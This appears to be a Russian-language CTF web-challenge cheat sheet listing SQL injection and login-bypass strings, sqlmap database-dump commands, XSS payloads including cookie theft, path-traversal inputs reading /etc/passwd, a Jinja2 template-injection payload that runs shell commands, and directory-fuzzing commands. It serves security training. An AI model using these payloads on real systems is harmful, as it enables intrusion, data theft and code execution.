# 🌐 Шпаргалка по веб-заданиям CTF

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../Web-CTF.md) • [🇷🇺 Русский раздел](../../README.ru.md)

> **Уточнение к JWT:** строка eyJ... в оригинале сокращена. JWT состоит из частей, разделённых точками и использующих Base64url; применение base64 -d ко всему токену не является общим способом его разбора. См. [RFC 7519](https://www.rfc-editor.org/rfc/rfc7519.html). Примеры с нулевым байтом в пути зависят от языка и версии; это исторические варианты проверки, а не универсальный обход.

[🇹🇷 Türkçe Sürüm](Web-CTF.tr.md) • [🇬🇷 Ελληνικά](Web-CTF.el.md)

---

## 💉 SQL-инъекция

### Базовые полезные нагрузки
```sql
' OR 1=1--
' OR '1'='1
" OR ""="
admin'--
' UNION SELECT NULL,NULL--
' UNION SELECT 1,2,3--
```

### SQLMap
```bash
sqlmap -u "http://url?id=1" --dbs
sqlmap -u "http://url?id=1" -D dbname --tables
sqlmap -u "http://url?id=1" -D dbname -T users --dump
```

---

## 📜 XSS — межсайтовый скриптинг

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(document.cookie)</script>
javascript:alert(1)
```

---

## 📁 LFI — включение локальных файлов

```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
/etc/passwd%00
php://filter/convert.base64-encode/resource=index.php
```

---

## 🔧 SSTI — внедрение в серверный шаблон

### Обнаружение
```
{{7*7}}     → 49 (Jinja2/Twig)
${7*7}      → 49 (Freemarker)
<%= 7*7 %>  → 49 (ERB)
```

### Jinja2 RCE
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

---

## 🔐 Обход аутентификации

```
admin' --
admin'/*
' OR 1=1 LIMIT 1--
Password: ' OR '1'='1
```

---

## 🍪 Cookie/JWT

```bash
# Декодирование JWT (см. уточнение ниже)
echo "eyJ..." | base64 -d

# Инструменты
jwt_tool.py token
jwt.io (online)
```

---

## 🛠️ Полезные инструменты

```bash
# Перебор каталогов
gobuster dir -u http://url -w wordlist.txt

# Фаззинг
ffuf -u http://url/FUZZ -w wordlist.txt

# Поиск параметров
arjun -u http://url
```

---

## 📋 Контрольный список веб-заданий CTF

```markdown
□ Проверить исходный код страницы (Ctrl+U)
□ Проверить robots.txt и sitemap.xml
□ Проверить cookies/JWT
□ Проверить SQLi в полях ввода
□ Проверить XSS в полях ввода
□ Проверить LFI в параметрах файлов
□ Проверить SSTI
□ Перебрать каталоги
□ Проверить доступность каталога .git
```

---

**К разделу CTF:** [🏁 Обзор CTF](./README.ru.md)
